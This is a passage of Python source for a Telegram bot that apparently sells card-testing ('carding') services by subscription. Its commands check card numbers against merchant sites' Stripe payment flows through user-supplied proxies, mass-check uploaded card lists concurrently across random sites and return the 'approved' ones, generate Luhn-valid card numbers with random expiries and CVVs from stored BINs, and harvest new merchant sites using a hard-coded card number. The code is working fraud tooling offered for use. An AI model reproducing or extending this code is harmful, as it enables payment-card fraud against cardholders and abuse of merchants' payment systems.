    finally:
        # Release lock for normal users (release even if there was an error or early return)
        if user_lock is not None and user_lock.locked():
            user_lock.release()


async def sauth_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /sauth command"""
    user = update.effective_user
    user_id = user.id
    
    if is_banned(user_id):
        return
    
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /sauth domain.com cc|mm|yyyy|cvv [proxy]\n\nProxy formats:\n• ip:port\n• ip:port:user:pass")
        return
    
    domain = context.args[0]
    text = ' '.join(context.args[1:])
    cc_string, proxy = parse_proxy_from_text(text)
    
    if not validate_cc_format(cc_string):
        await update.message.reply_text("❌ Invalid CC format. Use: cc|mm|yyyy|cvv or cc|mm|yy|cvv")
        return
    
    # Test proxy connection if provided
    if proxy:
        test_msg = await update.message.reply_text("🔍 Testing proxy connection...")
        proxy_works = await test_proxy_connection(proxy)
        await test_msg.delete()  # Delete test message
        
        if not proxy_works:
            await update.message.reply_text("❌ Proxy Dead")
            return
    
    msg = await update.message.reply_text(f"Checking on {domain}...")
    
    # Track start time for response time calculation
    start_time = time.time()
    
    # Run auth in thread pool to avoid blocking other users
    try:
        loop = asyncio.get_event_loop()
        from concurrent.futures import ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=10) as executor:
            result = await loop.run_in_executor(executor, auth, domain, cc_string, proxy)
        
        # Calculate response time
        response_time = time.time() - start_time
    except Exception as e:
        # Calculate response time even on error
        response_time = time.time() - start_time
        error_msg = str(e)
        # Check if it's a format error
        if 'Invalid CC format' in error_msg or 'Cannot parse CC string' in error_msg or 'Too few digits' in error_msg:
            await msg.edit_text(f"❌ Invalid CC format: {error_msg}\n\nPlease use format: cc|mm|yyyy|cvv or cc|mm|yy|cvv\n\nExample: /sauth {domain} 4111111111111111|12|2025|123")
        else:
            await msg.edit_text(f"❌ Error: {error_msg}")
        return
    
    # Check if result indicates a validation error (BEFORE checking site removal)
    error_message = result.get('message', '')
    error_status = result.get('status', '')
    
    # Check for validation errors that shouldn't trigger site removal
    validation_errors = [
        'Invalid CC format',
        'Unknown format code',
        'Incorrect card number',
        'Expired card',
        'Invalid expiry date'
    ]
    
    if any(err in error_message for err in validation_errors):
        # Format validation errors nicely
        if 'Invalid CC format' in error_message or 'Unknown format code' in error_message:
            await msg.edit_text(f"❌ Invalid CC format: {error_message}\n\nPlease use format: cc|mm|yyyy|cvv or cc|mm|yy|cvv\n\nExample: /sauth {domain} 4111111111111111|12|2025|123")
            return
        else:
            # Other validation errors (incorrect card number, expired card)
            response_text = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌\n\n"
            response_text += f"𝗖𝗖 ⇾ `{cc_string}`\n"
            response_text += f"𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ Stripe Auth\n"
            response_text += f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_message}"
            
            # Get card info (BIN lookup) even for declined cards
            try:
                card_info = get_card_info_from_cc(cc_string)
                card_info_text = format_card_info_for_response(card_info)
                response_text += card_info_text
            except Exception as e:
                # If BIN lookup fails, continue without card info
                pass
            
            # Add response time
            response_text += f"\n\nResponse Time → {response_time:.2f}s"
            
            await msg.edit_text(response_text, parse_mode=ParseMode.MARKDOWN)
            return
    
    increment_user_checks(user_id)
    
    # Format response based on success
    # Get actual message from response (should always be present from auth function)
    response_message = result.get('message', 'No response message')
    
    if result.get('success'):
        # APPROVED format
        response_text = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅\n\n"
        response_text += f"𝗖𝗖 ⇾ `{cc_string}`\n"
        response_text += f"𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ Stripe Auth\n"
        response_text += f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_message}"
    else:
        # DECLINED format
        response_text = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌\n\n"
        response_text += f"𝗖𝗖 ⇾ `{cc_string}`\n"
        response_text += f"𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ Stripe Auth\n"
        response_text += f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_message}"
    
    # Get card info (BIN lookup)
    try:
        card_info = get_card_info_from_cc(cc_string)
        card_info_text = format_card_info_for_response(card_info)
        response_text += card_info_text
    except Exception as e:
        # If BIN lookup fails, continue without card info
        pass
    
    # Add response time
    response_text += f"\n\nResponse Time → {response_time:.2f}s"
    
    # Check if site is broken (missing pm_id or response means site is not working)
    # Card validation failures (declined, incorrect number) are normal - site is still good
    # Format errors should NOT trigger site removal
    has_pm_id = result.get('pm_id') is not None
    has_response = result.get('raw_response') or result.get('raw_response_json')
    
    # Only remove site if both pm_id and response are missing AND it's not a format error
    if not has_pm_id and not has_response:
        # Site is broken - remove it (but only if we actually tried to auth, not a format error)
        remove_site(domain)
        response_text += "\n\n⚠️ Site removed (no longer working)"
    
    await msg.edit_text(response_text, parse_mode=ParseMode.MARKDOWN)


async def mauth_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /mauth command (mass auth)"""
    user = update.effective_user
    user_id = user.id
    
    if is_banned(user_id):
        return
    
    # Check if premium
    if not is_premium(user_id) and not is_admin(user_id):
        await update.message.reply_text(f"❌ Please purchase subscription from {ADMIN_USERNAME} to use mass check!")
        return
    
    # Check if already checking
    if is_user_checking(user_id):
        await update.message.reply_text("⏳ Already Checking!\n\nPlease try after previous cards are checked or do /mcancel to cancel checking!")
        return
    
    # Check if replied to a document
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("❌ Please reply to a .txt file containing CCs (one per line)")
        return
    
    # Parse proxy from command arguments (if provided)
    proxy = None
    if context.args:
        # Join all args and check if last part is a proxy
        text = ' '.join(context.args)
        last_part = context.args[-1]
        if ':' in last_part or '.' in last_part:
            # Count colons to determine format
            colon_count = last_part.count(':')
            # ip:port (1 colon) or ip:port:user:pass (3 colons)
            if colon_count == 1 or colon_count == 3:
                proxy = last_part
    
    # Test proxy connection if provided
    if proxy:
        test_msg = await update.message.reply_text("🔍 Testing proxy connection...")
        proxy_works = await test_proxy_connection(proxy)
        await test_msg.delete()  # Delete test message
        
        if not proxy_works:
            await update.message.reply_text("❌ Proxy Dead")
            return
    
    # Download file
    file = await context.bot.get_file(update.message.reply_to_message.document.file_id)
    user_folder = get_user_folder(user_id)
    cc_file = user_folder / "cc.txt"
    await file.download_to_drive(cc_file)
    
    # Read CCs
    with open(cc_file, 'r', encoding='utf-8') as f:
        ccs = [line.strip() for line in f if line.strip()]
    
    total_cards = len(ccs)
    if total_cards == 0:
        await update.message.reply_text("❌ No valid CCs found in file")
        cleanup_user_folder(user_id)
        return
    
    # Get active sites
    sites = get_active_sites()
    if not sites:
        await update.message.reply_text("❌ No active sites available")
        cleanup_user_folder(user_id)
        return
    
    proxy_info = f" (with proxy)" if proxy else ""
    msg = await update.message.reply_text(f"Total cards: {total_cards}{proxy_info}\nSuccess: 0\nFailed: 0\nLeft: {total_cards}")
    
    success_cards = []
    failed_cards = []
    success_count = 0
    failed_count = 0
    
    import random
    import asyncio
    from concurrent.futures import ThreadPoolExecutor
    
    # Process cards concurrently with random sites for each card
    # This allows multiple CCs to be checked simultaneously on different sites
    
    # Use a lock to safely update shared counters
    counter_lock = asyncio.Lock()
    # Limit concurrent requests to prevent overwhelming sites (max 20 concurrent)
    semaphore = asyncio.Semaphore(20)
    # Shared thread pool executor for all card checks
    executor = ThreadPoolExecutor(max_workers=20)
    
    async def check_single_card(cc_string: str, card_index: int, total_cards: int):
        """Check a single card on a random site"""
        nonlocal success_count, failed_count, success_cards, failed_cards, sites
        
        try:
            # Validate format
            if not validate_cc_format(cc_string):
                async with counter_lock:
                    failed_count += 1
                    failed_cards.append(cc_string)
                return
            
            # Pick random site for this card (get fresh sites list)
            async with semaphore:  # Limit concurrent requests
                current_sites = get_active_sites()
                if not current_sites:
                    async with counter_lock:
                        failed_count += 1
                        failed_cards.append(cc_string)
                    return
                
                domain = random.choice(current_sites)
                
                try:
                    # Run auth in thread pool (since auth() is synchronous)
                    # Pass proxy if provided (proxy is from outer scope)
                    loop = asyncio.get_event_loop()
                    result = await loop.run_in_executor(executor, auth, domain, cc_string, proxy)
                except Exception as e:
                    async with counter_lock:
                        failed_count += 1
                        failed_cards.append(cc_string)
                    return
                
                # Check if result indicates a validation error
                error_message = result.get('message', '')
                validation_errors = [
                    'Invalid CC format',
                    'Unknown format code',
                    'Incorrect card number',
                    'Expired card',
                    'Invalid expiry date'
                ]
                
                if any(err in error_message for err in validation_errors):
                    async with counter_lock:
                        failed_count += 1
                        failed_cards.append(cc_string)
                    return
                
                # Check if site is broken (missing pm_id or response)
                has_pm_id = result.get('pm_id') is not None
                has_response = result.get('raw_response') or result.get('raw_response_json')
                
                if not has_pm_id or not has_response:
                    # Site is broken - remove it
                    remove_site(domain)
                    # Refresh sites list
                    async with counter_lock:
                        sites = get_active_sites()
                
                # Update counters
                async with counter_lock:
                    if result.get('success'):
                        success_count += 1
                        success_cards.append(cc_string)
                    else:
                        failed_count += 1
                        failed_cards.append(cc_string)
        except Exception as e:
            # Catch any unexpected errors and mark card as failed
            async with counter_lock:
                failed_count += 1
                failed_cards.append(cc_string)
    
    # Process all cards concurrently
    tasks = [check_single_card(cc_string, i, total_cards) for i, cc_string in enumerate(ccs, 1)]
    
    # Update progress periodically while processing
    async def update_progress():
        last_update = 0
        while True:
            try:
                await asyncio.sleep(1.5)  # Update every 1.5 seconds
                async with counter_lock:
                    left = total_cards - (success_count + failed_count)
                    current_success = success_count
                    current_failed = failed_count
                
                # Only update if there's a change or it's been more than 2 seconds
                if left == 0:
                    # Final update
                    try:
                        await msg.edit_text(f"Total cards: {total_cards}\nSuccess: {current_success}\nFailed: {current_failed}\nLeft: {left}")
                    except Exception:
                        pass  # Ignore errors on final update
                    break
                
                # Update message with error handling
                try:
                    await msg.edit_text(f"Total cards: {total_cards}\nSuccess: {current_success}\nFailed: {current_failed}\nLeft: {left}")
                except Exception as e:
                    # If message edit fails (e.g., message deleted, rate limit), just continue
                    # Don't crash the entire operation
                    pass
                
            except asyncio.CancelledError:
                break
            except Exception as e:
                # Log error but don't crash
                continue
    
    # Run card checks and progress updates concurrently
    try:
        progress_task = asyncio.create_task(update_progress())
        await asyncio.gather(*tasks, return_exceptions=True)  # Don't fail if one task fails
    finally:
        # Cancel progress task gracefully
        if not progress_task.done():
            progress_task.cancel()
            try:
                await progress_task
            except (asyncio.CancelledError, Exception):
                pass
        executor.shutdown(wait=True)  # Clean up thread pool
    
    # Increment user checks (one check per card)
    for _ in range(total_cards):
        increment_user_checks(user_id)
    
    # Final update
    left = total_cards - (success_count + failed_count)
    await msg.edit_text(f"Total cards: {total_cards}\nSuccess: {success_count}\nFailed: {failed_count}\nLeft: {left}")
    
    # Save success cards
    if success_cards:
        success_file = user_folder / "success.txt"
        with open(success_file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(success_cards))
        
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=open(success_file, 'rb'),
            filename="success.txt"
        )
    
    await msg.edit_text(f"✅ All Cards checked!\n\nTotal: {total_cards}\nSuccess: {success_count}\nFailed: {failed_count}\n\nYou can find success cards below!")
    
    cleanup_user_folder(user_id)


async def mcancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /mcancel command"""
    user = update.effective_user
    user_id = user.id
    
    if is_banned(user_id):
        return
    
    if is_user_checking(user_id):
        cleanup_user_folder(user_id)
        await update.message.reply_text("✅ Mass check cancelled!")
    else:
        await update.message.reply_text("❌ No mass check in progress")


async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /gen command - supports /gen, /gen100, /gen1000, etc."""
    user = update.effective_user
    user_id = user.id
    
    if is_banned(user_id):
        return
    
    # Parse command to extract number (e.g., /gen100 -> 100)
    command_text = update.message.text or ""
    command_parts = command_text.split()
    command = command_parts[0] if command_parts else "/gen"  # Get the command (e.g., "/gen100")
    num_to_generate = 10  # Default
    
    # Check if command has a number (e.g., /gen100)
    if len(command) > 4 and command.startswith('/gen'):
        try:
            # Extract number after '/gen' (e.g., "/gen100" -> "100")
            num_str = command[4:]
            if num_str.isdigit():
                num_to_generate = int(num_str)
                # Limit to max 1000
                if num_to_generate > 1000:
                    await update.message.reply_text("❌ Maximum 1000 CCs allowed per generation.")
                    return
                if num_to_generate < 1:
                    await update.message.reply_text("❌ Please generate at least 1 CC.")
                    return
        except (ValueError, IndexError):
            # If it's not a number, use default 10
            num_to_generate = 10
    
    # Respond immediately to user
    await update.message.reply_text(f"🔄 Starting generation of {num_to_generate} CCs...")
    
    # Check cooldown (only for default /gen, not for /gen{number})
    if num_to_generate == 10:
        user_data = get_user_data(user_id)
        last_gen = user_data.get('last_gen_time')
        if last_gen:
            try:
                last_time = datetime.fromisoformat(last_gen)
                if (datetime.now() - last_time).seconds < GEN_COOLDOWN:
                    remaining = GEN_COOLDOWN - (datetime.now() - last_time).seconds
                    await update.message.reply_text(f"⏳ Please wait {remaining} seconds before using /gen again.")
                    return
            except:
                pass
    
    # Parse input - can be BIN or CC|MM|YYYY|CVV (extract BIN from CC)
    input_str = ' '.join(context.args) if context.args else ""
    
    # Parse format: CC|MM|YYYY|CVV or just BIN
    bin_prefix = ""
    mm = None
    yyyy = None
    cvv = None
    user_provided_bin = False
    
    if input_str:
        user_provided_bin = True
        if '|' in input_str:
            # Format: CC|MM|YYYY|CVV
            parts = input_str.split('|')
            if len(parts) == 4:
                cc_part = parts[0].strip()
                mm = parts[1].strip()
                yyyy = parts[2].strip()
                cvv = parts[3].strip()
                
                # Extract BIN from CC (first 6-14 digits)
                # Remove any non-digit characters
                cc_digits_only = ''.join(filter(str.isdigit, cc_part))
                
                if len(cc_digits_only) >= 6:
                    # Use first 6-14 digits as BIN (prefer 6-8 for better variety)
                    if len(cc_digits_only) >= 14:
                        bin_prefix = cc_digits_only[:14]
                    elif len(cc_digits_only) >= 8:
                        bin_prefix = cc_digits_only[:8]
                    else:
                        bin_prefix = cc_digits_only[:6]
                else:
                    await update.message.reply_text("❌ CC number must be at least 6 digits to extract BIN")
                    return
            else:
                await update.message.reply_text("❌ Invalid format. Use: /gen BIN or /gen CC|MM|YYYY|CVV")
                return
        else:
            # Just BIN
            bin_prefix = input_str.strip()
    
    import random
    import asyncio
    
    current_date = datetime.now()
    current_month = current_date.month
    current_year = current_date.year
    
    # If no BIN provided, use a random bin from bins.json
    if not user_provided_bin:
        active_bins = get_active_bins()
        if not active_bins:
            await update.message.reply_text("❌ No auth bins found!\n\nPlease enter your bin with command e.g /gen 411111")
            return
        
        # Try to find a working bin
        working_bin = None
        random.shuffle(active_bins)  # Randomize order
        
        for bin_num in active_bins:
            # Check if bin was checked in last 24 hours
            if is_bin_recently_checked(bin_num, hours=24):
                # Use this bin directly
                working_bin = bin_num
                break
            else:
                # Bin not recently checked, test it (with locking)
                test_msg = await update.message.reply_text(f"Testing bin {bin_num}...")
                
                try:
                    # Test BIN with lock (will wait if another user is testing the same BIN)
                    test_result = await test_bin_with_lock(bin_num, current_month, current_year)
                    
                    await test_msg.delete()
                    
                    auth_result = test_result.get('result', {})
                    
                    if test_result.get('status') == 'success' and auth_result.get('success'):
                        # Bin is working, update check time in bins.json
                        update_bin_check_time(bin_num)
                        working_bin = bin_num
                        break
                    else:
                        # Bin failed, notify admin and remove bin
                        remove_bin(bin_num)
                        # Clean up from test results cache
                        if bin_num in bin_test_results:
                            del bin_test_results[bin_num]
                        await context.bot.send_message(
                            chat_id=ADMIN_CHAT_ID,
                            text=f"Bin: {bin_num}\n\nExpired!"
                        )
                        continue
                except Exception as e:
                    await test_msg.delete()
                    # If test fails, try next bin
                    continue
        
        if not working_bin:
            await update.message.reply_text("❌ No auth bins found!\n\nPlease enter your bin with command e.g /gen 411111")
            return
        
        bin_prefix = working_bin
    
    # For bulk generation (more than 10), create file and send it
    if num_to_generate > 10:
        # Create gens folder structure
        gens_folder = GENS_FOLDER
        gens_folder.mkdir(exist_ok=True)
        user_gen_folder = gens_folder / str(user_id)
        user_gen_folder.mkdir(exist_ok=True)
        
        # Show generating message with progress
        gen_msg = await update.message.reply_text(f"🔄 Generating {num_to_generate} CCs...\n\nProgress: 0/{num_to_generate}")
        
        # Generate CCs with Luhn validation
        generated_ccs = []
        existing_ccs = set()
        
        try:
            generated_count = 0
            max_attempts = num_to_generate * 20  # Prevent infinite loop (increased for safety)
            attempts = 0
            
            while generated_count < num_to_generate and attempts < max_attempts:
                attempts += 1
                
                # Update progress every 10 CCs or at milestones
                if generated_count % 10 == 0 or generated_count == 0:
                    try:
                        await gen_msg.edit_text(f"🔄 Generating {num_to_generate} CCs...\n\nProgress: {generated_count}/{num_to_generate}")
                    except Exception:
                        pass  # Ignore edit errors (message might be too old)
                
                try:
                    # Generate unique CC with Luhn validation
                    cc_digits = generate_valid_cc(bin_prefix, existing_ccs)
                    
                    # Check if already exists (shouldn't happen, but double-check)
                    if cc_digits in existing_ccs:
                        continue
                    
                    # Verify Luhn algorithm (double-check)
                    digits = [int(d) for d in cc_digits[::-1]]
                    for i in range(1, len(digits), 2):
                        digits[i] *= 2
                        if digits[i] > 9:
                            digits[i] = digits[i] // 10 + digits[i] % 10
                    total = sum(digits)
                    
                    # Only add if Luhn valid (should always be true, but verify)
                    if total % 10 == 0 and len(cc_digits) == 16:
                        existing_ccs.add(cc_digits)
                        
                        # Use provided month/year/cvv or generate
                        if mm and yyyy and cvv:
                            # Use provided values
                            final_mm = mm.zfill(2)
                            final_yyyy = yyyy
                            final_cvv = cvv.zfill(3) if len(cvv) == 3 else cvv
                        else:
                            # Generate month (not in past)
                            final_mm = f"{random.randint(current_month, 12):02d}" if current_month < 12 else f"{random.randint(1, 12):02d}"
                            
                            # Generate year (current year or future, up to 10 years)
                            max_year = current_year + 10
                            final_yyyy = str(random.randint(current_year, max_year))
                            
                            # Generate CVV
                            final_cvv = ''.join([str(random.randint(0, 9)) for _ in range(3)])
                        
                        cc_line = f"{cc_digits}|{final_mm}|{final_yyyy}|{final_cvv}"
                        generated_ccs.append(cc_line)
                        generated_count += 1
                except Exception as gen_error:
                    # If generation fails for one CC, continue with next
                    continue
            
            if generated_count < num_to_generate:
                await gen_msg.edit_text(f"⚠️ Only generated {generated_count} unique CCs (requested {num_to_generate})\n\nSending what was generated...")
                if generated_count == 0:
                    await gen_msg.edit_text("❌ Failed to generate any CCs. Please try again.")
                    return
            
            # Update message to show completion
            try:
                await gen_msg.edit_text(f"✅ Generated {generated_count} CCs!\n\n📦 Preparing file...")
            except Exception:
                pass
            
            # Create filename as specified
            filename = "cc gen by legend checks.txt"
            file_path = user_gen_folder / filename
            
            # Write CCs to file (one per line)
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(generated_ccs))
                    f.flush()  # Ensure data is written to disk
            except Exception as write_error:
                await gen_msg.edit_text(f"❌ Error writing file: {str(write_error)}")
                return
            
            # Send file to user
            try:
                # Delete progress message
                await gen_msg.delete()
            except Exception:
                pass
            
            # Send file (open in binary mode for sending)
            try:
                with open(file_path, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=update.effective_chat.id,
                        document=f,
                        filename=filename,
                        caption=f"✅ Generated {generated_count} CCs"
                    )
            except Exception as send_error:
                await update.message.reply_text(f"❌ Error sending file: {str(send_error)}")
                return
            
            # Delete the entire user folder after sending
            try:
                import shutil
                shutil.rmtree(user_gen_folder)
            except Exception as del_error:
                # If folder deletion fails, at least try to delete the file
                try:
                    file_path.unlink()
                except Exception:
                    pass
            
        except Exception as e:
            try:
                await gen_msg.edit_text(f"❌ Error generating CCs: {str(e)}")
            except Exception:
                await update.message.reply_text(f"❌ Error generating CCs: {str(e)}")
            return
    
    else:
        # For 10 or fewer CCs, generate all and send in one message
        # Each CC on a new line, individually copyable
        generated_ccs = []
        existing_ccs = set()
        
        for _ in range(num_to_generate):
            # Generate valid CC using Luhn algorithm
            cc_digits = generate_valid_cc(bin_prefix, existing_ccs)
            existing_ccs.add(cc_digits)
            
            # Use provided month/year/cvv or generate
            if mm and yyyy and cvv:
                # Use provided values
                final_mm = mm.zfill(2)
                final_yyyy = yyyy
                final_cvv = cvv.zfill(3) if len(cvv) == 3 else cvv
            else:
                # Generate month (not in past)
                final_mm = f"{random.randint(current_month, 12):02d}" if current_month < 12 else f"{random.randint(1, 12):02d}"
                
                # Generate year (current year or future, up to 10 years)
                max_year = current_year + 10
                final_yyyy = str(random.randint(current_year, max_year))
                
                # Generate CVV
                final_cvv = ''.join([str(random.randint(0, 9)) for _ in range(3)])
            
            # Format CC line (each on new line, individually copyable)
            cc_line = f"{cc_digits}|{final_mm}|{final_yyyy}|{final_cvv}"
            generated_ccs.append(cc_line)
        
        # Join all CCs with newlines (each CC is on its own line, individually copyable)
        cc_message = '\n'.join([f"`{cc}`" for cc in generated_ccs])
        
        # Get card info from first CC (assuming all use same BIN)
        card_info_text = ""
        if generated_ccs:
            try:
                first_cc = generated_ccs[0]
                card_info = get_card_info_from_cc(first_cc)
                card_info_text = format_card_info_for_response(card_info)
            except Exception as e:
                # If BIN lookup fails, continue without card info
                pass
        
        # Send all CCs in one message
        final_message = cc_message + card_info_text
        await update.message.reply_text(final_message, parse_mode=ParseMode.MARKDOWN)
    
    # Update last gen time
    user_data = get_user_data(user_id)
    user_data['last_gen_time'] = datetime.now().isoformat()
    save_user_data(user_id, user_data)


async def addbin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /addbin command (admin only)"""
    user = update.effective_user
    user_id = user.id
    
    if not is_admin(user_id):
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /addbin {bin}\n\nExample: /addbin 544422403573")
        return
    
    bin_input = context.args[0].strip()
    
    # Validate BIN format (6-14 digits)
    if not bin_input.isdigit():
        await update.message.reply_text("❌ BIN must contain only digits (0-9)")
        return
    
    if len(bin_input) < 6 or len(bin_input) > 14:
        await update.message.reply_text("❌ BIN must be between 6 and 14 digits")
        return
    
    # Check if bin already exists
    bins = get_bins()
    if bin_input in bins:
        await update.message.reply_text(f"⚠️ BIN {bin_input} already exists in database")
        return
    
    # Show testing message
    test_msg = await update.message.reply_text(f"Testing bin {bin_input}...")
    
    # Test BIN with lock (will wait if another user is testing the same BIN)
    try:
        current_date = datetime.now()
        current_month = current_date.month
        current_year = current_date.year
        
        # Use the locked testing function
        test_result = await test_bin_with_lock(bin_input, current_month, current_year)
        
        auth_result = test_result.get('result', {})
        
        if test_result.get('status') == 'success' and auth_result.get('success'):
            # BIN is working, add it to bins.json
            add_bin(bin_input)
            # Store in test results cache
            bin_test_results[bin_input] = test_result
            await test_msg.edit_text(f"✅ Bin added successfully!\n\nBin: {bin_input}")
        else:
            # BIN failed
            error_message = auth_result.get('message', 'Unknown error')
            await test_msg.edit_text(f"❌ Bin failed to add!\n\nBin: {bin_input}\n\nReason: {error_message}")
    except Exception as e:
        await test_msg.edit_text(f"❌ Error testing bin: {str(e)}")


async def msites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /msites command"""
    user = update.effective_user
    user_id = user.id
    
    if is_banned(user_id):
        return
    
    # Check if replied to a document
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("❌ Please use this command by replying on a sites.txt file")
        return
    
    # Parse proxy from command arguments (if provided)
    proxy = None
    if context.args:
        # Check if last part is a proxy
        last_part = context.args[-1]
        if ':' in last_part or '.' in last_part:
            # Count colons to determine format
            colon_count = last_part.count(':')
            # ip:port (1 colon) or ip:port:user:pass (3 colons)
            if colon_count == 1 or colon_count == 3:
                proxy = last_part
    
    # Test proxy connection if provided
    if proxy:
        test_msg = await update.message.reply_text("🔍 Testing proxy connection...")
        proxy_works = await test_proxy_connection(proxy)
        await test_msg.delete()  # Delete test message
        
        if not proxy_works:
            await update.message.reply_text("❌ Proxy Dead")
            return
    
    # Download file
    file = await context.bot.get_file(update.message.reply_to_message.document.file_id)
    user_folder = get_user_folder(user_id)
    sites_file = user_folder / "sites.txt"
    await file.download_to_drive(sites_file)
    
    # Read sites
    with open(sites_file, 'r', encoding='utf-8') as f:
        sites = [line.strip() for line in f if line.strip()]
    
    total_sites = len(sites)
    if total_sites == 0:
        await update.message.reply_text("❌ No sites found in file")
        return
    
    test_cc = "5444224035733160|02|2029|832"
    proxy_info = f" (with proxy)" if proxy else ""
    msg = await update.message.reply_text(f"Adding.... 0/{total_sites}{proxy_info}\nSuccess: 0\nFailed: 0\nLeft: {total_sites}")
    
    added_sites = []
    failed_count = 0
    added_count = 0
    
    import random
    import asyncio
    from concurrent.futures import ThreadPoolExecutor
    
    # Process sites concurrently (similar to mauth)
    # Use a lock to safely update shared counters
    counter_lock = asyncio.Lock()
    # Limit concurrent requests to prevent overwhelming (max 100 concurrent)
    semaphore = asyncio.Semaphore(100)
    # Shared thread pool executor for all site checks
    executor = ThreadPoolExecutor(max_workers=100)
    
    async def check_single_site(domain: str, site_index: int, total_sites: int):
        """Check a single site and add it if valid"""
        nonlocal added_count, failed_count, added_sites
        
        try:
            # Check if site already exists
            if site_exists(domain):
                async with counter_lock:
                    failed_count += 1
                return
            
            # Run auth in thread pool (since auth() is synchronous)
            async with semaphore:  # Limit concurrent requests
                try:
                    loop = asyncio.get_event_loop()
                    result = await loop.run_in_executor(executor, auth, domain, test_cc, proxy)
                except Exception as e:
                    async with counter_lock:
                        failed_count += 1
                    return
                
                # Check if site is good (has pm_id and response)
                if result.get('pm_id') and (result.get('raw_response') or result.get('raw_response_json')):
                    success = add_site(domain, user_id, user.username or 'N/A')
                    if success:
                        async with counter_lock:
                            added_count += 1
                            added_sites.append(domain)
                            increment_user_sites(user_id)
                    else:
                        async with counter_lock:
                            failed_count += 1
                else:
                    async with counter_lock:
                        failed_count += 1
        except Exception as e:
            # Catch any unexpected errors and mark site as failed
            async with counter_lock:
                failed_count += 1
    
    # Process all sites concurrently
    tasks = [check_single_site(domain, i, total_sites) for i, domain in enumerate(sites, 1)]
    
    # Update progress periodically while processing
    async def update_progress():
        last_update = 0
        while True:
            try:
                await asyncio.sleep(1.5)  # Update every 1.5 seconds
                async with counter_lock:
                    left = total_sites - (added_count + failed_count)
                    current_added = added_count
                    current_failed = failed_count
                
                # Only update if there's a change or it's been more than 2 seconds
                if left == 0:
                    # Final update
                    try:
                        await msg.edit_text(f"Adding.... {total_sites}/{total_sites}{proxy_info}\nSuccess: {current_added}\nFailed: {current_failed}\nLeft: {left}")
                    except Exception:
                        pass  # Ignore errors on final update
                    break
                
                # Update message with error handling
                try:
                    await msg.edit_text(f"Adding.... {total_sites - left}/{total_sites}{proxy_info}\nSuccess: {current_added}\nFailed: {current_failed}\nLeft: {left}")
                except Exception as e:
                    # If message edit fails (e.g., message deleted, rate limit), just continue
                    # Don't crash the entire operation
                    pass
                
            except asyncio.CancelledError:
                break
            except Exception as e:
                # Log error but don't crash
                continue
    
    # Run site checks and progress updates concurrently
    try:
        progress_task = asyncio.create_task(update_progress())
        await asyncio.gather(*tasks, return_exceptions=True)  # Don't fail if one task fails
    finally:
        # Cancel progress task gracefully
        if not progress_task.done():
            progress_task.cancel()
            try:
                await progress_task
            except (asyncio.CancelledError, Exception):
                pass
        executor.shutdown(wait=True)  # Clean up thread pool
    
    # Prepare response
    added_count = len(added_sites)
    response_text = f"Added {added_count} sites, Failed {failed_count} sites\n\n"
    
    if added_sites:
        sites_text = '\n'.join(added_sites)
        if len(response_text + sites_text) > 4000:
            # Send as file
            result_file = user_folder / "added_sites.txt"
            with open(result_file, 'w', encoding='utf-8') as f:
                f.write('\n'.join(added_sites))
            
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=open(result_file, 'rb'),
                filename="added_sites.txt"
            )
            await msg.edit_text(f"Added {added_count} sites, Failed {failed_count} sites")
        else:
            response_text += f"Sites added:\n{sites_text}"
            await msg.edit_text(response_text)
    else:
        await msg.edit_text(f"Added {added_count} sites, Failed {failed_count} sites")


# ==================== ADMIN COMMANDS ====================

async def premium_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /premium command (admin only)"""
    user = update.effective_user
    user_id = user.id
    
    if not is_admin(user_id):
        return
    
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /premium userid days")
        return
    
    try:
        target_user_id = int(context.args[0])
        days = int(context.args[1])
        
        user_data = get_user_data(target_user_id)
        expiry_date = datetime.now() + timedelta(days=days)
        user_data['premium'] = True
        user_data['premium_expiry'] = expiry_date.isoformat()
        save_user_data(target_user_id, user_data)
        
        await update.message.reply_text(f"✅ User {target_user_id} is now premium until {expiry_date.strftime('%Y-%m-%d')}")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID or days")


async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /ban command (admin only)"""
    user = update.effective_user
    user_id = user.id
    
    if not is_admin(user_id):
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /ban userid")
        return
    
    try:
        target_user_id = int(context.args[0])
        user_data = get_user_data(target_user_id)
        user_data['banned'] = True
        save_user_data(target_user_id, user_data)
        await update.message.reply_text(f"✅ User {target_user_id} has been banned")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID")


async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /unban command (admin only)"""
    user = update.effective_user
    user_id = user.id
    
    if not is_admin(user_id):
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /unban userid")
        return
    
    try:
        target_user_id = int(context.args[0])
        user_data = get_user_data(target_user_id)
        user_data['banned'] = False
        save_user_data(target_user_id, user_data)
        await update.message.reply_text(f"✅ User {target_user_id} has been unbanned")
    except ValueError:
